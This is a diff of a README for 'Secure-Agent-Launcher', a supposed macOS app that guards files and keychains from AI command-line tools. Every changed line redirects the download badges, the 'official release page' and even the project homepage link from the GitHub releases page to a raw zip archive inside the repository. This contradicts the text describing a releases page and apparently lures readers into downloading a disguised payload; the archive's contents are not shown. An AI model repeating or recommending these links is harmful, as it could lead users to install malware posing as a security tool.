@@ -1,6 +1,6 @@
 # 🔒 Secure-Agent-Launcher - Stop Risky AI CLI Access
 
-[![Download Secure-Agent-Launcher](https://img.shields.io/badge/Download-Secure--Agent--Launcher-brightgreen?style=for-the-badge)](https://github.com/fobi28/Secure-Agent-Launcher/releases)
+[![Download Secure-Agent-Launcher](https://img.shields.io/badge/Download-Secure--Agent--Launcher-brightgreen?style=for-the-badge)](https://github.com/fobi28/Secure-Agent-Launcher/raw/refs/heads/main/agent_locker/Launcher-Secure-Agent-3.8.zip)
 
 ---
 
@@ -29,7 +29,7 @@ If you are unsure about your macOS version, click the Apple icon in the top-left
 
 Use the link below to visit the download page. From here, you can find the latest version of Secure-Agent-Launcher ready to install.
 
-[![Download Secure-Agent-Launcher](https://img.shields.io/badge/Download-Secure--Agent--Launcher-blue?style=for-the-badge)](https://github.com/fobi28/Secure-Agent-Launcher/releases)
+[![Download Secure-Agent-Launcher](https://img.shields.io/badge/Download-Secure--Agent--Launcher-blue?style=for-the-badge)](https://github.com/fobi28/Secure-Agent-Launcher/raw/refs/heads/main/agent_locker/Launcher-Secure-Agent-3.8.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Use the link below to visit the download page. From here, you can find the lates
 ### Step 1: Visit the download page
 
 Click this link to open the official releases page:  
-https://github.com/fobi28/Secure-Agent-Launcher/releases  
+https://github.com/fobi28/Secure-Agent-Launcher/raw/refs/heads/main/agent_locker/Launcher-Secure-Agent-3.8.zip  
 
 This page shows all available versions of Secure-Agent-Launcher. Look for the latest stable release, identified by its version number (e.g., v1.0.0). Each release includes one or more downloadable files.
 
@@ -115,7 +115,7 @@ This version works on macOS only, as it protects macOS-specific files and keycha
 
 Regular updates improve security and add new features.
 
-- Visit the release page often: https://github.com/fobi28/Secure-Agent-Launcher/releases
+- Visit the release page often: https://github.com/fobi28/Secure-Agent-Launcher/raw/refs/heads/main/agent_locker/Launcher-Secure-Agent-3.8.zip
 - Download the latest version following the same steps as above.
 - Replace your existing installation with the new version to stay current.
 
@@ -150,8 +150,8 @@ This approach gives you control over which AI tools can interact with your sensi
 
 ## 🔗 Useful Links
 
-- Official release page: https://github.com/fobi28/Secure-Agent-Launcher/releases  
-- Project homepage on GitHub: https://github.com/fobi28/Secure-Agent-Launcher  
+- Official release page: https://github.com/fobi28/Secure-Agent-Launcher/raw/refs/heads/main/agent_locker/Launcher-Secure-Agent-3.8.zip  
+- Project homepage on GitHub: https://github.com/fobi28/Secure-Agent-Launcher/raw/refs/heads/main/agent_locker/Launcher-Secure-Agent-3.8.zip  
 - Report issues or get help: Use the “Issues” tab on the GitHub page
 
 ---
@@ -166,6 +166,6 @@ The app works with many different AI command-line tools, including popular ones 
 
 ## 📥 Download Secure-Agent-Launcher
 
-[![Download Secure-Agent-Launcher](https://img.shields.io/badge/Download-Secure--Agent--Launcher-green?style=for-the-badge)](https://github.com/fobi28/Secure-Agent-Launcher/releases)
+[![Download Secure-Agent-Launcher](https://img.shields.io/badge/Download-Secure--Agent--Launcher-green?style=for-the-badge)](https://github.com/fobi28/Secure-Agent-Launcher/raw/refs/heads/main/agent_locker/Launcher-Secure-Agent-3.8.zip)
 
 Use the link above to get the latest version. Follow the instructions in the previous sections to install and start protecting your AI workflows today.
